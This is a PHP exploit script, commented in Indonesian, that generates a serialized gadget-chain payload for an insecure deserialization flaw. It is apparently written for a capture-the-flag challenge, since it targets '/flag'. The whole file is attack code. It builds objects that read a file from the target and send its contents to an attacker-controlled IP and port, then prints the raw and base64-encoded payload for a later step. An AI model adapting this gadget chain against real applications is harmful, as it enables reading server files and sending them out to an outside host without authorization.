<?php
// EXPLOIT.PHP - Jalankan di lokal untuk generate payload

// Ganti dengan IP server attacker Anda
$ATTACKER_IP = "192.168.132.132";  // contoh: 123.45.67.89 atau localhost:8080
$ATTACKER_PORT = "8080";

// ============================================
// SIMULASI CLASS (harus sama persis dengan di aplikasi)
// ============================================

class IntegrationRelay {
    public $scheme = 'http';
    public $host;
    public $port;
    public $path = '/';
    
    public function __construct($host, $port) {
        $this->host = $host;
        $this->port = $port;
    }
}

class DeliveryTarget {
    public $relay;
    public $field = 'data';
    public $expectedChannel = 'summary';
    
    public function __construct($relay) {
        $this->relay = $relay;
    }
}

class LocalAssetStore {
    public $root = '/';
    public $prefix = '';
}

class AssetCatalog {
    public $stores = [];
}

class SnapshotView {
    public $catalog;
    public $path = '/flag';
    public $field = 'content';
    
    public function __construct($catalog) {
        $this->catalog = $catalog;
    }
}

class SnippetLayout {
    public $view;
    public $wrapper = '{{body}}';
}

class PreviewEnvelope {
    public $layout;
    public $meta = [];
    
    public function __construct($layout) {
        $this->layout = $layout;
        $this->meta = [
            'path' => '/flag',
            'slot' => 'summary'
        ];
    }
}

class DeliveryJournal {
    public $target;
    public $armed = true;
    public $channel = 'summary';
    
    public function __construct($target) {
        $this->target = $target;
    }
}

class PreviewBatch {
    public $items = [];
    public $journal;
    public $profile = [];
    public $state = 'sealed';
    
    public function __construct($items, $journal) {
        $this->items = $items;
        $this->journal = $journal;
        $this->profile = [
            'channel' => 'summary',
            'callback' => "http://{$this->journal->target->relay->host}:{$this->journal->target->relay->port}/"
        ];
    }
}

// ============================================
// MEMBANGUN RANTAI GADGET
// ============================================

// 1. Buat relay ke server attacker
$relay = new IntegrationRelay($ATTACKER_IP, $ATTACKER_PORT);

// 2. Buat delivery target
$target = new DeliveryTarget($relay);

// 3. Buat asset store untuk baca file
$store = new LocalAssetStore();
$catalog = new AssetCatalog();
$catalog->stores = [$store];

// 4. Buat view untuk mengambil file
$view = new SnapshotView($catalog);
$view->path = '/flag';

// 5. Buat layout
$layout = new SnippetLayout();
$layout->view = $view;

// 6. Buat envelope
$envelope = new PreviewEnvelope($layout);

// 7. Buat journal
$journal = new DeliveryJournal($target);

// 8. Buat batch (ini yang akan di-unserialize)
$batch = new PreviewBatch([$envelope], $journal);

// ============================================
// OUTPUT
// ============================================

$serialized = serialize($batch);
$base64 = base64_encode($serialized);

echo "\n========== PHP SERIALIZED PAYLOAD ==========\n";
echo $serialized . "\n\n";
echo "========== BASE64 ENCODED ==========\n";
echo $base64 . "\n\n";
echo "========== SIMPAN BASE64 INI UNTUK LANGKAH 3 ==========\n";
?>
